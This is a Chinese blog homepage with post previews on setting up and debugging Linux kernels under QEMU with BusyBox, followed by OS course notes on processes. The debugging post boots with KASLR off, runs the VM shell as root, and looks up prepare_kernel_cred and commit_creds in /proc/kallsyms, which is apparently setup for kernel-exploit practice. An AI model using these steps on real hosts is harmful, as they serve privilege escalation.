
<!DOCTYPE html>
<html lang="en | zh-CN |zh-TW">
<head>
    <meta charset="utf-8" />
    <title>Q^Q</title>
    <meta name="author" content="desk9t" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.1.1"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>Q^Q</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;Q^Q</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>Q^Q</h1>
                <h3></h3>
                <h5></h5>
            </div>
        </span>
    </div>
</div>
<div id="home-posts-wrap" true ref="homePostsWrap">
    <div id="home-posts">
        

<div class="post">
    <a href="/2024/02/24/qemu%E8%B0%83%E8%AF%95/">
        <h2 class="post-title">qemu调试</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/2/24
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>调试建议</p>
<p>为方便调试，可以修改<code>_install</code>文件下的<code>init</code>文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">+ setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure>

<p>在启动时，指定内核关闭随机化</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \  <span class="comment">#这里</span></span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>



<p>获取内核地址</p>
<p>qemu中</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br></pre></td></tr></table></figure>

<p>查看装载的驱动</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure>

<p>获取驱动加载的基地址</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># method 1</span></span><br><span class="line">grep target_module_name /proc/modules </span><br><span class="line"><span class="comment"># method 2</span></span><br><span class="line"><span class="built_in">cat</span> /sys/module/target_module_name/sections/.text </span><br></pre></td></tr></table></figure>

<p>&#x2F;sys&#x2F;module&#x2F; 目录下存放着加载的各个模块的信息。</p>
<p>启动调试</p>
<p>qemu 其实提供了调试内核的接口，我们可以在启动参数中添加 <code>-gdb dev</code> 来启动调试服务。最常见的操作为在一个端口监听一个 tcp 连接。 QEMU 同时提供了一个简写的方式 <code>-s</code>，表示 <code>-gdb tcp::1234</code>，即在 1234 端口开启一个 gdbserver。</p>
<p>当我们以调试模式启动内核后，我们就可以在另外一个终端内使用如下命令来连接到对应的 gdbserver，开始调试。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q -ex <span class="string">&quot;target remote localhost:1234&quot;</span></span><br></pre></td></tr></table></figure>

<p>在启动内核后，我们可以使用 <code>add-symbol-file</code> 来添加符号信息，比如</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file vmlinux的路径</span><br><span class="line">add-symbol-file .ko文件的路径 先前查看的.ko文件的地址</span><br></pre></td></tr></table></figure>

<p>没有vmlinux文件，可以用脚本<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>提取.<br>但是据说，有个更好的<a target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a></p>
<p>注意：在调试时开始时qume窗口可能会卡住，此时需要在gdb窗口键入<code>start</code>，两个窗口才能开始互动。</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/02/24/qemu%E8%B0%83%E8%AF%95/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/02/22/qemu%E7%8E%AF%E5%A2%83/">
        <h2 class="post-title">qemu环境</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/2/22
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h3 id="qume"><a href="#qume" class="headerlink" title="qume"></a>qume</h3><p>qume也是一种虚拟机只不过，看起来不一样。</p>
<p><a target="_blank" rel="noopener" href="https://www.qemu.org/">下载</a>qume</p>
<p>qemu的安装有分内核级和用户级</p>
<ul>
<li><strong>Debian&#x2F;Ubuntu:</strong><ul>
<li>For full system emulation: <code>apt-get install qemu-system</code></li>
<li>For emulating Linux binaries: <code>apt-get install qemu-user-static</code></li>
</ul>
</li>
</ul>
<h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>在准备好虚拟机，准备好内核以后，也不能直接运行，缺少文件系统。<br>连最基础的<code>ls</code> 命令都不能执行。</p>
<p>根文件系统主要由基本的shell命令、各种库、字符设备、配置脚本组成</p>
<p><a target="_blank" rel="noopener" href="https://busybox.net/">下载</a>busybox</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-**.tar.bz2</span><br><span class="line">tar -jxf busybox-**.tar.bz2</span><br></pre></td></tr></table></figure>

<h4 id="编译配置"><a href="#编译配置" class="headerlink" title="编译配置"></a>编译配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>在 Setttings <u>选中</u> Build static binary (no shared libs)，将 busybox 编译为静态链接的文件；在 Linux System Utilities 中<u>取消选中</u> Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)；在 Networking Utilities 中<u>取消选中</u> inetd。</p>
<p>编译</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j8 all</span><br></pre></td></tr></table></figure>

<p>编译好了不能直接用</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>安装后busybox文件夹下会有一个<code>_install</code>目录。busybox生成的文件都在其中的<code>bin</code>，<code>lib</code>,<code>linuxrc</code>,<code>sbin</code>,<code>usr</code>文件夹中</p>
<p>我们可以在 <code>_install</code> 目录下创建以下文件夹(也可以将以上文件<code>cp</code>到我们的想要的地方)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>

<p>并创建 <code>init</code> 作为 linux 的启动脚本，内容为</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh </span><br><span class="line"><span class="comment">#setsid /bin/cttyhack setuidgid 0 /bin/sh #以root启动</span></span><br></pre></td></tr></table></figure>

<p>加上权限</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x init</span><br></pre></td></tr></table></figure>

<p>之后在 <code>_install</code> 目录下<u>打包</u>整个文件系统</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img  </span><br></pre></td></tr></table></figure>

<ul>
<li><code>-i</code>：这个选项表示“提取”，用于从 cpio 归档中提取文件。</li>
<li><code>-d</code>：此选项在提取文件时创建必要的目录，确保重新创建完整的目录结构。</li>
<li><code>-m</code>：此选项将文件修改时间设置为当前时间，而不是归档中存储的时间。</li>
<li><code>-v</code>：此选项表示“详细”，显示有关提取过程的详细信息，显示正在提取的每个文件。</li>
</ul>
<p>注意：如果将生成镜像的位置选在当前目录，有可能会在生成过程中把<u>自己</u>包含进去导致出错。</p>
<p>解包文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.img</span><br></pre></td></tr></table></figure>

<p>启动内核</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line"><span class="comment">#    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot; \   #方便调试</span></span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>

<p>在用 qemu 启动内核时，常用的选项如下</p>
<ul>
<li>-m， 指定 RAM 大小，默认 384M，内存太小可能导致启动失败。</li>
<li>-kernel，指定内核镜像文件 bzImage 路径</li>
<li>-initrd，设置内核启动的内存文件系统</li>
<li><code>-smp [cpus=]n[,cores=cores][,threads=threads][,dies=dies][,sockets=sockets][,maxcpus=maxcpus]</code>，指定使用到的核数。</li>
<li>-cpu，指定指定要模拟的处理器架构，可以同时开启一些保护，如<ul>
<li>+smap，开启 smap 保护</li>
<li>+smep，开启 smep 保护</li>
</ul>
</li>
<li>-nographic，表示不需要图形界面</li>
<li>-monitor，对 qemu 提供的控制台进行重定向，如果没有设置的话，可以直接进入控制台。</li>
<li>-append，附加选项<ul>
<li><code>nokaslr</code> 关闭随机偏移</li>
<li>console&#x3D;ttyS0，和 <code>nographic</code> 一起使用，启动的界面就变成了当前终端。</li>
</ul>
</li>
</ul>
<p>制作sd卡</p>
<p>还有一种方法制作文件系统</p>
<p>生成根文件系统镜像</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=rootfs.ext3 bs=1M count=32</span><br></pre></td></tr></table></figure>

<p>将<code>rootfs.ext3</code>看成sd卡，</p>
<p>格式化sd卡</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext3 rootfs.ext3</span><br></pre></td></tr></table></figure>

<p>因为块设备不能直接写，需要先挂载到目录，然后再进行一些操作</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -t ext3 rootfs.ext3 /mnt/ -o loop</span><br><span class="line"><span class="comment">#-t ext3，表示文件系统是ext3格式</span></span><br><span class="line"><span class="comment">#其中-o loop=：使用 loop 模式用来将一个档案当成硬盘分割挂上系统。</span></span><br></pre></td></tr></table></figure>

<p><code>ls</code>查看<code>/mnt</code>，内容自然是空的。</p>
<p>此时将<code>_install</code>文件下的文件拷贝到<code>/mnt/</code>下</p>
<p>卸载<code>sd</code>卡</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">umount /mnt</span><br></pre></td></tr></table></figure>

<p>新<code>boot.sh</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm\</span><br><span class="line">        -m 512M\</span><br><span class="line">        -kernel ./test/zImage\</span><br><span class="line">        -nographic\</span><br><span class="line">        -append <span class="string">&quot;root=/dev/mmcblk0 rw console=ttyAMA0&quot;</span>\</span><br><span class="line">        -sd rootfs.ext3</span><br></pre></td></tr></table></figure>



<p>加载驱动</p>
<p>将.ko驱动文件复制到先前的<code>_install</code>目录，修改启动脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">insmod /ko_test.ko</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<ul>
<li><code>lsmod</code>查看的驱动</li>
<li><code>rmmod</code>移除驱动</li>
<li><code>insmod</code>安装驱动</li>
</ul>
<p>启动后有一大片输出，稍后也可以用<code>dmesg</code>查看</p>
<p>从qume中退出时<code>ctl+a+x</code></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/02/22/qemu%E7%8E%AF%E5%A2%83/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/01/15/OS/">
        <h2 class="post-title">OS</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/1/15
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="2-进程的描述与控制"><a href="#2-进程的描述与控制" class="headerlink" title="2.进程的描述与控制"></a>2.进程的描述与控制</h1><h2 id="2-1前驱图和程序执行"><a href="#2-1前驱图和程序执行" class="headerlink" title="2.1前驱图和程序执行"></a>2.1前驱图和程序执行</h2><h3 id="2-1-1前驱图"><a href="#2-1-1前驱图" class="headerlink" title="2.1.1前驱图"></a>2.1.1前驱图</h3><h3 id="2-1-2程序的顺序执行"><a href="#2-1-2程序的顺序执行" class="headerlink" title="2.1.2程序的顺序执行"></a>2.1.2程序的顺序执行</h3><h4 id="1-程序的顺序执行"><a href="#1-程序的顺序执行" class="headerlink" title="1.程序的顺序执行"></a>1.程序的顺序执行</h4><h4 id="2-程序的顺序执行时的特征"><a href="#2-程序的顺序执行时的特征" class="headerlink" title="2.程序的顺序执行时的特征"></a>2.程序的顺序执行时的特征</h4><ol>
<li>顺序性</li>
<li>封闭性</li>
<li>可再现性</li>
</ol>
<h3 id="2-1-3程序并发执行"><a href="#2-1-3程序并发执行" class="headerlink" title="2.1.3程序并发执行"></a>2.1.3程序并发执行</h3><h4 id="1-程序的并发执行"><a href="#1-程序的并发执行" class="headerlink" title="1.程序的并发执行"></a>1.程序的并发执行</h4><h4 id="2-程序并发执行的特征"><a href="#2-程序并发执行的特征" class="headerlink" title="2.程序并发执行的特征"></a>2.程序并发执行的特征</h4><ol>
<li>间断性</li>
<li>失去封闭性</li>
<li>不可再现性</li>
</ol>
<h2 id="2-2进程的描述"><a href="#2-2进程的描述" class="headerlink" title="2.2进程的描述"></a>2.2进程的描述</h2><h3 id="2-2-1进程的的定义与特征"><a href="#2-2-1进程的的定义与特征" class="headerlink" title="2.2.1进程的的定义与特征"></a>2.2.1进程的的定义与特征</h3><p><em>进程是程序的执行过程，时系统进行资源分配和调度的一个独立单位</em></p>
<h4 id="1-进程的定义"><a href="#1-进程的定义" class="headerlink" title="1.进程的定义"></a>1.进程的定义</h4><h4 id="2-进程的特征"><a href="#2-进程的特征" class="headerlink" title="2.进程的特征"></a>2.进程的特征</h4><ol>
<li><p>动态性</p>
</li>
<li><p>并发性</p>
<p>只有存在PCB后才能实现并发</p>
</li>
<li><p>独立性</p>
</li>
<li><p>异步性</p>
</li>
</ol>
<h3 id="进程的基本状态与转换"><a href="#进程的基本状态与转换" class="headerlink" title="进程的基本状态与转换"></a>进程的基本状态与转换</h3><h4 id="1-进程的3种基本状态"><a href="#1-进程的3种基本状态" class="headerlink" title="1.进程的3种基本状态"></a>1.进程的3种基本状态</h4><ol>
<li>就绪状态</li>
</ol>
<p>​		<em>已准备好除CPU的所有资源</em></p>
<ol>
<li>执行状态</li>
<li>阻塞状态</li>
</ol>
<p>​		<em>因事件(等待资源，IO..)而无法执行</em></p>
<p><em>以单处理机为例，除了执行态，都有相应的等待队列</em></p>
<h4 id="2-进程3种基本状态间的转换"><a href="#2-进程3种基本状态间的转换" class="headerlink" title="2.进程3种基本状态间的转换"></a>2.进程3种基本状态间的转换</h4><h4 id="3-创建状态和终止状态"><a href="#3-创建状态和终止状态" class="headerlink" title="3.创建状态和终止状态"></a>3.创建状态和终止状态</h4><ol>
<li><p>创建状态</p>
<ul>
<li>申请PCB并填入信息</li>
<li>分配资源</li>
</ul>
<p><em>完成以上任务期间过程就是创建状态</em></p>
</li>
<li><p>终止状态</p>
<p><em>清零PCB并归还内存</em></p>
</li>
</ol>
<h3 id="2-2-3挂起操作和进程状态的转换"><a href="#2-2-3挂起操作和进程状态的转换" class="headerlink" title="2.2.3挂起操作和进程状态的转换"></a>2.2.3挂起操作和进程状态的转换</h3><h4 id="1-操作系统的引入"><a href="#1-操作系统的引入" class="headerlink" title="1.操作系统的引入"></a>1.操作系统的引入</h4><ol>
<li>终端用户的需求</li>
<li>父进程的需要</li>
<li>负荷调节的需要</li>
<li>OS的需要</li>
</ol>
<h4 id="2。引入挂起操作后进程3个基本状态之间的转换"><a href="#2。引入挂起操作后进程3个基本状态之间的转换" class="headerlink" title="2。引入挂起操作后进程3个基本状态之间的转换"></a>2。引入挂起操作后进程3个基本状态之间的转换</h4><ol>
<li>活动就绪-静止就绪</li>
<li>活动阻塞-精致阻塞</li>
<li>静止就绪-活动就绪</li>
<li>静止阻塞-活动阻塞</li>
</ol>
<p><em>注意别犯傻的，区分[操作]和[状态],三种状态均可实施挂起操作</em></p>
<p><em>只有阻塞和就绪两种状态会因此变化</em></p>
<h4 id="3-引入挂起操作后进程五个基本状态间的转换"><a href="#3-引入挂起操作后进程五个基本状态间的转换" class="headerlink" title="3.引入挂起操作后进程五个基本状态间的转换"></a>3.引入挂起操作后进程五个基本状态间的转换</h4><ol>
<li>NULL-创建</li>
<li>创建-活动就绪</li>
<li>创建-静止就绪</li>
<li>执行-终止</li>
</ol>
<h3 id="2-2-4进程管理中的数据结构"><a href="#2-2-4进程管理中的数据结构" class="headerlink" title="2.2.4进程管理中的数据结构"></a>2.2.4进程管理中的数据结构</h3><h4 id="1-OS中用于管理资源和控制进程的数据结构"><a href="#1-OS中用于管理资源和控制进程的数据结构" class="headerlink" title="1.OS中用于管理资源和控制进程的数据结构"></a>1.OS中用于管理资源和控制进程的数据结构</h4><h4 id="2-PCB的的作用"><a href="#2-PCB的的作用" class="headerlink" title="2.PCB的的作用"></a>2.PCB的的作用</h4><ol>
<li>作为独立运行基本单位的标志</li>
</ol>
<p>​		<strong>系统是通过感知PCB判断进程</strong></p>
<ol>
<li><p>实现间断运行方式</p>
<p><strong>保留现场(上下文切换)</strong></p>
</li>
<li><p>提供进程管理所需要的信息</p>
</li>
<li><p>提供进程调度所需要的信息</p>
</li>
<li><p>实现与其他进程的同步与通信</p>
</li>
</ol>
<h4 id="3-PCB中的信息"><a href="#3-PCB中的信息" class="headerlink" title="3.PCB中的信息"></a>3.PCB中的信息</h4><ol>
<li>进程标识符<ul>
<li>外部标识符</li>
<li>内部标识符</li>
</ul>
</li>
<li>处理机状态</li>
<li>进程调度信息</li>
<li>进程控制信息</li>
</ol>
<p>4.PCB的组织方式</p>
<ol>
<li>线性方式</li>
<li>链接方式</li>
<li>索引方式</li>
</ol>
<h2 id="2-3进程控制"><a href="#2-3进程控制" class="headerlink" title="2.3进程控制"></a>2.3进程控制</h2><h3 id="2-3-1进程的创建"><a href="#2-3-1进程的创建" class="headerlink" title="2.3.1进程的创建"></a>2.3.1进程的创建</h3><h4 id="1-进程的层次结构"><a href="#1-进程的层次结构" class="headerlink" title="1.进程的层次结构"></a>1.进程的层次结构</h4><h4 id="2-进程图"><a href="#2-进程图" class="headerlink" title="2.进程图"></a>2.进程图</h4><h4 id="3-引起进程创建的事件"><a href="#3-引起进程创建的事件" class="headerlink" title="3.引起进程创建的事件"></a>3.引起进程创建的事件</h4><ol>
<li>用户登录</li>
<li>作业调度</li>
<li>提供服务</li>
<li>应用请求</li>
</ol>
<h4 id="4-进程的创建"><a href="#4-进程的创建" class="headerlink" title="4.进程的创建"></a>4.进程的创建</h4><h3 id="2-3-2进程的终止"><a href="#2-3-2进程的终止" class="headerlink" title="2.3.2进程的终止"></a>2.3.2进程的终止</h3><h4 id="1-引起进程终止的事件"><a href="#1-引起进程终止的事件" class="headerlink" title="1.引起进程终止的事件"></a>1.引起进程终止的事件</h4><ol>
<li>正常结束</li>
<li>异常结束</li>
<li>外界干预</li>
</ol>
<h4 id="2-进程的终止过程"><a href="#2-进程的终止过程" class="headerlink" title="2.进程的终止过程"></a>2.进程的终止过程</h4><h3 id="2-3-3进程的阻塞与唤醒"><a href="#2-3-3进程的阻塞与唤醒" class="headerlink" title="2.3.3进程的阻塞与唤醒"></a>2.3.3进程的阻塞与唤醒</h3><h4 id="1-引起进程阻塞与唤醒的事件"><a href="#1-引起进程阻塞与唤醒的事件" class="headerlink" title="1.引起进程阻塞与唤醒的事件"></a>1.引起进程阻塞与唤醒的事件</h4><ol>
<li>向系统请求共享资源失败</li>
<li>等待某种操作的完成</li>
<li>新数据尚未到达</li>
<li>等待新任务的到达</li>
</ol>
<h4 id="2-进程阻塞过程"><a href="#2-进程阻塞过程" class="headerlink" title="2.进程阻塞过程"></a>2.进程阻塞过程</h4><h3 id="3-进程唤醒过程"><a href="#3-进程唤醒过程" class="headerlink" title="3.进程唤醒过程"></a>3.进程唤醒过程</h3><h3 id="2-3-4进程的挂起与激活"><a href="#2-3-4进程的挂起与激活" class="headerlink" title="2.3.4进程的挂起与激活"></a>2.3.4进程的挂起与激活</h3><h4 id="1-进程的挂起"><a href="#1-进程的挂起" class="headerlink" title="1.进程的挂起"></a>1.进程的挂起</h4><h4 id="2-进程的激活"><a href="#2-进程的激活" class="headerlink" title="2.进程的激活"></a>2.进程的激活</h4><h2 id="2-4进程通信"><a href="#2-4进程通信" class="headerlink" title="2.4进程通信"></a>2.4进程通信</h2><h3 id="2-4-1进程通信的类型"><a href="#2-4-1进程通信的类型" class="headerlink" title="2.4.1进程通信的类型"></a>2.4.1进程通信的类型</h3><h4 id="共享存储器系统"><a href="#共享存储器系统" class="headerlink" title="共享存储器系统"></a>共享存储器系统</h4><ol>
<li>基于共享树结构的通信方式</li>
<li>基于共享存储区的通信方式</li>
</ol>
<h4 id="2-管道通信系统"><a href="#2-管道通信系统" class="headerlink" title="2.管道通信系统"></a>2.管道通信系统</h4><ol>
<li>互斥</li>
<li>同步</li>
<li>确认对方是否存在</li>
</ol>
